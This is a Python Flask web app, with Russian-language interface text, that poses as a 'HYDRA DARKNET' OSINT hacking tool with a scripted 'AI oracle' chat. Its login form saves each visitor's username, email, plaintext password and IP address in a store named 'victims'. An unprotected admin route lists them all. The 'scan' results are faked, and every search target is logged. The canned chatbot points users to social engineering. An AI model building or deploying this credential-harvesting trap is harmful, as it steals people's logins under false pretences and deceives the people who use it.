from flask import Flask, request, jsonify, render_template_string, session, redirect
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'HYDRA_AI_ORACLE_2026'

db = {"victims": [], "logs": []}

# --- ИНТЕРФЕЙС С ИИ-ЧАТОМ ---
ORACLE_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA DARKNET v7.0 | AI</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
        .main-container { display: flex; height: 100vh; padding: 10px; gap: 10px; box-sizing: border-box; }
        
        .sidebar { width: 250px; border: 1px solid #bc13fe; background: rgba(5,0,10,0.9); padding: 15px; box-shadow: 0 0 15px #bc13fe; display: flex; flex-direction: column; }
        .content { flex: 1; display: flex; flex-direction: column; gap: 10px; }
        .terminal { flex: 2; border: 2px solid #bc13fe; background: rgba(0,0,0,0.95); padding: 20px; overflow: hidden; position: relative; }
        
        /* СЕКЦИЯ ИИ-ОРАКУЛА */
        .ai-sector { flex: 1; border: 1px solid #0ff; background: rgba(0,10,20,0.9); padding: 10px; display: flex; flex-direction: column; }
        #ai-chat { flex: 1; overflow-y: auto; font-size: 12px; color: #0ff; margin-bottom: 5px; border-bottom: 1px solid #333; }
        .ai-input { background: transparent; border: 1px solid #0ff; color: #0f0; width: 100%; padding: 5px; font-size: 12px; outline: none; }
        
        .header { color: #0ff; text-align: center; font-size: 18px; text-shadow: 0 0 10px #0ff; margin-bottom: 10px; border-bottom: 1px dashed #bc13fe; }
        .input-area { display: flex; gap: 10px; margin-bottom: 10px; }
        input { background: transparent; border: 1px solid #bc13fe; color: #0f0; flex: 1; padding: 8px; outline: none; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; font-size: 12px; }
        #display { height: 150px; overflow-y: auto; font-size: 12px; color: #0f0; border: 1px solid #333; padding: 10px; }
        #map { height: 120px; border: 1px solid #bc13fe; margin-top: 5px; display: none; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div class="main-container">
        <div class="sidebar">
            <div style="color:#0ff; border-bottom:1px solid #bc13fe; margin-bottom:10px;">[ NODE STATUS ]</div>
            <div style="font-size:10px; color:#0f0;">> AI CORE: ONLINE</div>
            <div style="font-size:10px; color:#0f0;">> UPTIME: 99.9%</div>
            <hr style="border:0; border-top:1px solid #333; margin: 10px 0;">
            <div class="ai-sector">
                <div style="font-size:10px; color:#0ff; margin-bottom:5px;">// HYDRA AI ORACLE</div>
                <div id="ai-chat">SYSTEM: Приветствую, оператор. Задавай вопрос...</div>
                <input class="ai-input" id="ai-q" placeholder="Спроси ИИ..." onkeydown="if(event.key==='Enter') askAI()">
            </div>
        </div>

        <div class="content">
            <div class="terminal">
                <div class="header">// HYDRA OSINT CORE v7.0 //</div>
                <div class="input-area">
                    <input id="target" placeholder="TARGET NICK / PHONE / IP...">
                    <button class="btn" onclick="startScan()">SCAN</button>
                </div>
                <div id="display">> WAITING FOR INPUT...</div>
                <div id="map"></div>
            </div>
            <div style="text-align:center;"><button class="btn" onclick="window.location.href='/abupaay_admin'">[ ADMIN ]</button></div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        // MATRIX (ФИОЛЕТОВЫЙ)
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const drops = Array(Math.floor(canvas.width/16)).fill(1);
        function draw() {
            ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = '#bc13fe'; ctx.font = '15px monospace';
            drops.forEach((y, i) => {
                ctx.fillText(String.fromCharCode(Math.random()*128), i*16, y*16);
                if(y*16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(draw, 33);

        // AI LOGIC
        function askAI() {
            const q = document.getElementById('ai-q').value;
            const chat = document.getElementById('ai-chat');
            if(!q) return;
            chat.innerHTML += `<br><span style="color:#fff">YOU: ${q}</span>`;
            document.getElementById('ai-q').value = "";
            
            setTimeout(() => {
                let ans = "Система занята вычислениями...";
                const lowQ = q.toLowerCase();
                if(lowQ.includes("кто ты")) ans = "Я — разум HYDRA. Твой проводник в мире данных.";
                else if(lowQ.includes("как взломать")) ans = "Используй социальную инженерию и наш OSINT модуль. Все инструменты перед тобой.";
                else if(lowQ.includes("привет")) ans = "Здравствуй. Какую цель сегодня пробиваем?";
                else if(lowQ.includes("код")) ans = "Чистый код — залог невидимости. Пиши на Python, как мы.";
                else ans = "Запрос принят. Анализирую возможности... Ответ: Действуй по протоколу.";
                
                chat.innerHTML += `<br><span style="color:#0ff">AI: ${ans}</span>`;
                chat.scrollTop = chat.scrollHeight;
            }, 600);
        }

        // SCAN LOGIC
        let map;
        function startScan() {
            const val = document.getElementById('target').value;
            const disp = document.getElementById('display');
            if(!val) return;
            disp.innerHTML = `<span style="color:#ff0055">[*] ЗАПУСК СКАНИРОВАНИЯ: ${val}</span>`;
            
            fetch('/api/log_action', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target:val})});

            setTimeout(() => {
                disp.innerHTML += `<br>> Обход защиты... OK<br>> Поиск по 100 базам... DONE`;
                document.getElementById('map').style.display = 'block';
                if(!map) {
                    map = L.map('map').setView([41.311, 69.240], 13);
                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                }
                disp.innerHTML += `<br><span style="color:#0ff">[+] Найдено: <a href="https://instagram.com/${val}" target="_blank" style="color:#fff">ОТКРЫТЬ ПРОФИЛЬ</a></span>`;
            }, 1000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    if 'reg' not in session:
        return f"<!DOCTYPE html><html><head>{ORACLE_UI.split('</style>')[0]}</style></head><body style='display:flex; justify-content:center; align-items:center;'><div style='border:2px solid #bc13fe; padding:40px; text-align:center; background:#050505; box-shadow:0 0 20px #bc13fe;'><h1>// HYDRA LOGIN //</h1><form action='/api/reg' method='POST'><input name='u' placeholder='USER' required><br><input name='e' placeholder='EMAIL' required><br><input name='p' type='password' placeholder='PASS' required><br><button style='background:#bc13fe; color:#fff; border:none; padding:10px 20px; cursor:pointer; font-weight:bold; margin-top:10px;'>ENTER</button></form></div></body></html>"
    return render_template_string(ORACLE_UI)

@app.route('/api/reg', methods=['POST'])
def reg():
    db['victims'].append({"u": request.form.get('u'), "e": request.form.get('e'), "p": request.form.get('p'), "ip": request.remote_addr, "time": datetime.now().strftime("%H:%M:%S")})
    session['reg'] = True
    return redirect('/')

@app.route('/api/log_action', methods=['POST'])
def log_act():
    db['logs'].append({"target": request.json['target'], "time": datetime.now().strftime("%H:%M:%S")})
    return jsonify({"ok": True})

@app.route('/abupaay_admin')
def admin():
    u_list = "".join([f"<tr><td>{x['u']}</td><td>{x['e']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>ADMIN</h1><table border='1' width='100%'><tr><th>User</th><th>Email</th><th>Pass</th><th>IP</th></tr>{u_list}</table></body></html>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
